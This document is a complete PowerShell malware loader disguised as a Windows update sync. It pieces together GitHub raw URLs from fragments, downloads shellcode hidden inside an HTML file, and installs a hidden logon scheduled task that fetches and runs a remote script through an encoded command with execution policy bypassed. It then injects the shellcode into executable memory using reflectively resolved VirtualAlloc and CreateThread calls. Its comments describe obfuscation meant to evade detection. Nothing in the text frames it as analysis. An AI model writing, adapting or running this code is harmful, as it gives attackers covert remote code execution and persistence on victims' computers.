# --- 1. Environment & Fragmented URL Setup ---
$p1 = 'h' + 'tt' + 'ps://'; $p2 = 'raw.git' + 'hubuser'; $p3 = 'content.com/gwyn1869/winupdate/main/test.html'
$htmlUrl = $p1 + $p2 + $p3
$htmlPath = "$env:TEMP\sys_cache.html"

# --- 2. Self-Healing & Fragmented Download ---
if (!(Test-Path $htmlPath) -or (Get-Item $htmlPath).Length -lt 100) {
    # Using a wildcard alias to hide 'Invoke-RestMethod'
    $irm = (Get-Command I*e-R*tM*d).Name
    & $irm -Uri $htmlUrl -OutFile $htmlPath
}

# --- 3. Persistent Task Logic (The fragmented 'inner_task') ---
$pt1 = 'h' + 'tt' + 'ps://'; $pt2 = 'raw.git' + 'hubuser'; $pt3 = 'content.com/gwyn1869/winupdate/main/drop.ps1'
$inner_task = "Start-Sleep -s 8; try { `$a='$pt1$pt2'; `$b='$pt3'; `$d=(Invoke-RestMethod (`$a+`$b)); . ([scriptblock]::Create(`$d)) } catch {}"
$enc_task = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inner_task))
$arg_enc = '-' + 'Enc' + 'oded' + 'Command'

# Check and Create Task silently
if (!(schtasks /Query /TN "WinUpdateSync" 2>$null)) {
    $xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass $arg_enc $enc_task</Arguments></Exec></Actions></Task>"
    $xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode
    schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F >$null
    Remove-Item "$env:TEMP\t.xml" -Force
}

# --- 4. Injection Functions (Heavily Fragmented) ---

function Invoke-VirtualAlloc {
    Param ([IntPtr]$lpAddress, [UInt32]$dwSize, [UInt32]$flAllocationType, [UInt32]$flProtect)
    $bName = 'Assem' + 'blyBuilder'
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq $bName }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    
    # Fragmenting the API name 'VirtualAlloc'
    $vName = 'Virt' + 'ualAl' + 'loc'
    $MethodBuilder = $TypeBuilder.DefineMethod($vName, [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
    
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @($vName, $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    
    $lib = 'api-ms-win' + '-core-memory-' + 'l1-1-0.dll'
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, $lib, [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod($vName, [IntPtr], @([IntPtr], [UInt32], [UInt32], [UInt32]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod($vName)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``5[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
    $ProxyMethod.Invoke($lpAddress, $dwSize, $flAllocationType, $flProtect)
}

function Invoke-CreateThread {
    Param ([IntPtr]$lpThreadAttributes, [UInt32]$dwStackSize, [IntPtr]$lpStartAddress, [IntPtr]$lpParameter, [UInt32]$dwCreationFlags, [IntPtr]$lpThreadId)
    $tName = 'Cre' + 'ateTh' + 'read'
    $AsmBuilder = [System.Reflection.Assembly].Assembly.GetTypes() | ? {$_.Name -eq 'AssemblyBuilder' }
    $AssemblyBuilder = $AsmBuilder::DefineDynamicAssembly('TestAssembly_2', 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('TestModule', $False)
    $TypeBuilder = $ModuleBuilder.DefineType('Kernel32', [Reflection.TypeAttributes]::Public)
    $MethodBuilder = $TypeBuilder.DefineMethod($tName, [Reflection.MethodAttributes] 'Public, Static, PinvokeImpl', [Reflection.CallingConventions] 'Standard', [IntPtr], [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([Type[]] @([String]))
    $FieldInfoArray = @([Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('BestFitMapping'), [Runtime.InteropServices.DllImportAttribute].GetField('ThrowOnUnmappableChar'))
    $FieldArguments = @($tName, $False, $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, $False, $False)
    
    $lib = 'api-ms-win' + '-core-process' + 'threads-l1-1-0.dll'
    $CustomAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, $lib, [Reflection.FieldInfo[]] $FieldInfoArray, [Object[]] $FieldArguments)
    $MethodBuilder.SetCustomAttribute($CustomAttribBuilder)
    $MethodBuilder.SetImplementationFlags([Reflection.MethodImplAttributes]::PreserveSig)
    $Kernel32 = $TypeBuilder.CreateType()
    
    $MethodInfo = New-Object Reflection.Emit.DynamicMethod($tName, [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
    $Generator = $MethodInfo.GetILGenerator()
    $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_0); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_1); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_2); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_3); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 4)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ldarg_S, ([Byte] 5)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Call, $Kernel32.GetMethod($tName)); $Generator.Emit([System.Reflection.Emit.OpCodes]::Ret)
    $ProxyMethod = $MethodInfo.CreateDelegate([Func``7[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
    $ProxyMethod.Invoke($lpThreadAttributes, $dwStackSize, $lpStartAddress, $lpParameter, $dwCreationFlags, $lpThreadId)
}

# --- 5. Reassemble & Logic Execution ---
try {
    $htmlContent = Get-Content $htmlPath -Raw
    $parts = [regex]::Matches($htmlContent, "(?<=dmr)(.*?)(?=dmr)").Value
    $byteArray = $parts | Where-Object { $_ -match '^\d+$' } | ForEach-Object { [byte]$_ }
} catch {
    Remove-Item $htmlPath -Force
    return
}

if ($byteArray.Length -gt 10) {
    $ShellcodeAddr = Invoke-VirtualAlloc -lpAddress ([IntPtr]::Zero) -dwSize $byteArray.Length -flAllocationType 0x3000 -flProtect 0x40
    if ($ShellcodeAddr -ne [IntPtr]::Zero) {
        [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $ShellcodeAddr, $byteArray.Length)
        Invoke-CreateThread -lpThreadAttributes ([IntPtr]::Zero) -dwStackSize 0 -lpStartAddress $ShellcodeAddr -lpParameter ([IntPtr]::Zero) -dwCreationFlags 0 -lpThreadId ([IntPtr]::Zero) | Out-Null
        Start-Sleep -Seconds 5
    }
}
